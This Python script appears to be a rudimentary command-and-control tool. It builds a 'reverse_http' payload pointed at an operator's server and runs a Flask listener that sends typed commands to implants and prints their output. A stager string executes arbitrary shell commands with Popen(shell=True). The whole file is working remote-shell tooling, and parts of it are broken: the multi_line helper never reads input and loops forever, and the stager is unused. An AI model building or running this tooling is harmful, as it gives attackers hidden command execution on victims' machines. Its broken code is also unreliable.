#!/usr/bin/python3

def multi_line(msg=None):
	print(msg)
	print("This is a multi-line input. When you are done, enter ':q' on a new line.")
	text = ''
	while True:
		newline = "> "
		if newline == ":q":
			break
		else:
			if len(text) == 0:
				text += newline
			else:
				text += "\n" + newline
	return text

#STAGER#
stager = '''
from subprocess import Popen, PIPE
import os
def run_cmd(cmd):
	if ' ' in cmd and cmd.split(" ")[0] == "cd":
		try:
			os.chdir(cmd.split(" ")[1])
			return os.getcwd()
		except:
			return "error"
	else:
		res = Popen(cmd,stdout=PIPE,shell=True).communicate()[0]
		try:
			return res.decode()
		except:
			return str(res)
url = "%s"
# continue from here
'''
#STAGER#

while True:
	print('''
1. Build payload
2. Start server
3. Exit
''')
	choice = input("Option number: ")
	if choice == "1":
		url = input("Enter url of server: ")
		with open("./templates/reverse_http.py","r") as f:
			tplate = f.read()
		payload = ("url = '%s'" % url) + tplate
		filename = input("Enter filename to save payload to: ")
		with open(filename,"w") as f:
			f.write(payload)
		print("Saved payload.")
	elif choice == "2":
		from flask import Flask, request
		app = Flask(__name__)
		@app.route("/",methods=['GET'])
		def serve_cmd():
			if 'res' in request.args:
				print(request.args['res'])
			cmd = input("CMD# ")
			return cmd, 200
		app.run(host="0.0.0.0",port=1029)
	elif choice == "3":
		break
	else:
		print("Invalid command")
